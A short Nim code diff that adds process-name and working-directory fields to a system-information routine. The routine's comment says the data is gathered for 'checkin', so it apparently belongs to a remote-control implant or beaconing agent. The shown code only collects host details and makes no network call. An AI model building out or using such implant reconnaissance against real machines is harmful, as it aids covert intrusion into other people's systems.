@@ -10,6 +10,8 @@ type
     ips*: seq[string]
     domain*: string
     integrityLevel*: int
+    processName*: string
+    cwd*: string
 
 proc getSystemInfo*(): SystemInfo =
   ## Collect system information for checkin
@@ -88,3 +90,15 @@ proc getSystemInfo*(): SystemInfo =
   
   # Integrity level (simplified)
   result.integrityLevel = 2  # Medium by default
+  
+  # Get process name
+  try:
+    result.processName = getAppFilename().extractFilename()
+  except:
+    result.processName = "poopsie.exe"
+  
+  # Get current working directory
+  try:
+    result.cwd = getCurrentDir()
+  except:
+    result.cwd = "/"
